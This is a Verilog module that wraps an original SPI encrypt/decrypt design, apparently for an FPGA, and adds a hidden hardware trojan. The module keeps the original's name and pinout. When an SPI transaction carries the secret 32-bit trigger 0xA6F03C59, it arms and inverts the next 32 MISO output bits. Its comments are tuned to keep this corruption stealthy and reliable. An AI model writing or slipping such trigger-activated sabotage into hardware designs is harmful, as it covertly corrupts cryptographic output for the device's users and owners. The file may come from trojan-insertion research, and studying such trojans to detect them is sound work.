module recovered (
    input  wire pin_36, // SCK
    input  wire pin_25, // ENC_DEC
    input  wire pin_28, // NORM_CS_N
    input  wire pin_32, // MOSI
    input  wire pin_34, // RST_N
    input  wire pin_27, // START
    output wire pin_38, // BUSY
    output wire pin_23, // ICE_LED
    output wire pin_31  // MISO
);

    wire orig_miso;

    // Instantiate original unmodified design
    recovered_original inst_recovered_original (
        .pin_36(pin_36),
        .pin_25(pin_25),
        .pin_28(pin_28),
        .pin_32(pin_32),
        .pin_34(pin_34),
        .pin_27(pin_27),
        .pin_38(pin_38),
        .pin_23(pin_23),
        .pin_31(orig_miso)
    );

    logic [5:0]  bit_cnt;
    logic        payload_active;
    logic [31:0] shift_reg;
    logic        armed;

    // SCK-clocked domain 1: Bit counter and payload active tracking.
    // pin_28 (CS_N) safely resets transaction state asynchronously.
    always_ff @(posedge pin_36 or posedge pin_28) begin
        if (pin_28) begin
            bit_cnt        <= 6'b0;
            payload_active <= 1'b0;
        end else begin
            if (!pin_34) begin
                bit_cnt        <= 6'b0;
                payload_active <= 1'b0;
            end else begin
                // Increment until saturation
                if (bit_cnt < 6'd63) begin
                    bit_cnt <= bit_cnt + 1'b1;
                end
                
                // Transfer arming to payload_active at the start of the payload transaction
                if (bit_cnt == 6'd0 && armed) begin
                    payload_active <= 1'b1;
                end
            end
        end
    end

    // SCK-clocked domain 2: Trigger logic and arming mechanism.
    // No async reset here, so 'armed' naturally survives between transactions.
    always_ff @(posedge pin_36) begin
        if (!pin_34) begin
            shift_reg <= 32'b0;
            armed     <= 1'b0;
        end else if (!pin_28) begin
            shift_reg <= {shift_reg[30:0], pin_32};

            if (bit_cnt == 6'd0 && armed) begin
                // Disarm immediately: payload_active takes over corruption responsibility.
                armed <= 1'b0;
            end
            
            if (bit_cnt == 6'd31) begin
                // Evaluate exact 32-bit transaction trigger matching
                if (!payload_active) begin
                    if ({shift_reg[30:0], pin_32} == 32'hA6F03C59) begin
                        armed <= 1'b1;
                    end
                end
            end else if (bit_cnt == 6'd32) begin
                // Safely clear state if the transaction is malformed (>32 bits).
                // This ensures A6F03C59 is ONLY recognized if the transaction ends here.
                armed <= 1'b0;
            end
        end
    end

    // MISO corruption logic:
    // MISO modification is guarded by NORM_CS_N being active (low).
    // `armed` covers the critical 1st bit (CPHA=0 driven on CS edge),
    // and `payload_active` seamlessly handles the remaining bits.
    // `bit_cnt < 32` guarantees we ONLY corrupt 32 bits, and it perfectly
    // prevents the timing issue of altering the trigger transaction's final bit.
    assign pin_31 = ((armed || payload_active) && (bit_cnt < 6'd32) && !pin_28) ? ~orig_miso : orig_miso;

endmodule
